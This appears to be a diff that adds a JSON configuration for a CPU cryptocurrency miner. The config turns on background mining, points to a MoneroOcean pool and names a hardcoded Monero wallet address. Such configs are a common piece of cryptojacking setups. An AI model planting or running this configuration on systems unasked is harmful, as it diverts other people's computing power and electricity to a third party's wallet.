@@ -1,0 +1,25 @@
+{
+    "autosave": false,
+    "background": true,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "hw-aes": null,
+        "priority": 5,
+        "asm": true,
+        "yield": true,
+        "max-threads-hint": 50
+    },
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": null,
+            "url": "gulf.moneroocean.stream:10128",
+            "user": "47VK2eBkdVXhpegk4UGVzXBQp7fd93gkFDFpiprNzJL9FcjUZLzNRHf3EwbGvFeVLfRAHvYRyfMV6UbJuQjREE1ZSiX6AWQ",
+            "tls": false,
+            "keepalive": true,
+        }
+    ]
+}
